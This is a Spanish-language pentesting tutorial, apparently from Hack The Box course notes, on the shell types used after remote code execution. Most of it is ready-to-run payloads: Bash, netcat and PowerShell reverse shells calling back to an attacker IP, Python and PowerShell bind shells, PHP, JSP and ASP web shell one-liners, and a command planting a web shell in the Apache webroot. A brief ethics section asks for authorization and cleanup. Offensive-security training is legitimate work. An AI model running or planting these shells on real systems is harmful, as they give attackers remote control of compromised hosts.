# Tipos de shells

Una vez comprometido un sistema y lograda la RCE (Remote Code Execution), necesitamos un método **fiable** para comunicarnos con el host sin re‑explotar cada vez. Ese método es obtener acceso directo a un **shell** del sistema (Bash en Linux/Unix o PowerShell en Windows).

Además del acceso autenticado vía **SSH (Secure Shell)** en Linux o **WinRM (Windows Remote Management)** en Windows (cuando disponemos de credenciales), contamos con tres tipos principales de shells:

| Tipo de shell     | Método de comunicación                                                                                                                                                                                   |
| ----------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Reverse Shell** | El host comprometido se **conecta de vuelta** a nuestra máquina atacante.                                                                                                                                |
| **Bind Shell**    | El host comprometido **escucha** en un puerto y **nos conectamos** a él.                                                                                                                                 |
| **Web Shell**     | Se comunica a través del **servidor web** (HTTP (Hypertext Transfer Protocol)/HTTPS (Hypertext Transfer Protocol Secure)), ejecutando comandos recibidos por parámetros y mostrando la salida en la web. |

---

## Reverse Shell (conexión inversa)

### 1) Iniciar un listener con Netcat (nc)

```bash
nc -lvnp 1234
```

**Flags:**

* `-l` (listen): modo escucha.
* `-v` (verbose): salida detallada.
* `-n` (no DNS): evita resolución DNS.
* `-p 1234`: puerto local a la escucha.

### 2) Comprobar nuestra IP (interfaz VPN tun0 en HTB)

```bash
ip a
```

Salida esperada (extracto):

```
3: tun0: <...>
    inet 10.10.10.10/23 scope global tun0
```

### 3) Lanzar la carga (payload) de reverse shell desde el objetivo

**Bash (Linux):**

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

**Bash/SH alternativa (Linux):**

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

**PowerShell (Windows):**

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

**Ejemplo de conexión recibida:**

```bash
nc -lvnp 1234
# listening on [any] 1234 ...
# connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> Ventaja: rápido y sencillo. Desventaja: frágil; si se corta, hay que re‑lanzar el payload.

---

## Bind Shell (conexión directa hacia el objetivo)

El objetivo abre un puerto y asocia su shell a ese puerto; luego **nos conectamos** desde la máquina atacante.

### 1) Lanzar bind shell en el objetivo

**Bash (Linux):**

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

**Python (Python):**

```python
python -c 'exec("""import socket as s,subprocess as sp;\ns1=s.socket(s.AF_INET,s.SOCK_STREAM);\ns1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);\ns1.bind((\"0.0.0.0\",1234));\ns1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

**PowerShell (Windows):**

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

### 2) Conectarnos desde la máquina atacante

```bash
nc 10.10.10.1 1234
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> Ventaja: si se corta nuestra conexión, podemos reconectar. Desventaja: depende de que el puerto siga abierto/servicio activo.

---

## Actualización de TTY (conseguir PTY interactivo)

Al obtener un shell por Netcat, suele ser **no interactivo** (sin historial, sin edición de línea). Podemos mejorarlo:

### 1) Elevar a PTY (Pseudo‑TTY) con Python

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

### 2) Poner en segundo plano, ajustar terminal y volver al foreground

```text
www-data@remotehost$ ^Z
```

```bash
stty raw -echo
fg

# pulsa Enter dos veces, o escribe 'reset' si es necesario
```

### 3) Ajustar tamaño y tipo de terminal

Obtener variables locales:

```bash
echo $TERM
stty size
```

Ejemplo de ajuste en el shell remoto:

```bash
export TERM=xterm-256color
stty rows 67 columns 318
```

---

## Web Shell

Un **Web Shell** es un script (p. ej., PHP (Hypertext Preprocessor), JSP (JavaServer Pages), ASP (Active Server Pages)) que recibe el comando por parámetros HTTP y devuelve la salida.

### 1) One‑liners típicos

**PHP:**

```php
<?php system($_REQUEST["cmd"]); ?>
```

**JSP:**

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

**ASP (Active Server Pages):**

```asp
<% eval request("cmd") %>
```

### 2) Ubicación del webroot (raíces por defecto)

* **Apache:** `/var/www/html/`
* **Nginx:** `/usr/local/nginx/html/`
* **IIS (Internet Information Services):** `C:\inetpub\wwwroot\`
* **XAMPP:** `C:\xampp\htdocs\`

### 3) Escribir el shell en el webroot (ejemplo Apache + PHP)

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

### 4) Ejecutar comandos vía navegador o cURL

**Navegador:**

```
http://SERVER_IP:PORT/shell.php?cmd=id
```

**cURL (Client URL):**

```bash
curl "http://SERVER_IP:PORT/shell.php?cmd=id"
```

Salida esperada:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> Ventajas: suele evadir restricciones porque usa puertos web (80/443); persiste tras reinicios si el archivo queda en disco. Desventajas: menos interactivo (se puede semi‑automatizar con un script en Python (Python)).

---

## Notas operativas y ética

* Siempre dentro de **alcance y autorización** del cliente.
* Considera cortafuegos/NAT: Reverse Shell puede requerir reenvío de puertos; Bind Shell puede quedar bloqueado por filtros.
* Tras obtener acceso, **registra evidencias** y realiza **limpieza** (elimina backdoors/web shells si no están acordados para persistencia).

---

*Fin del documento.*
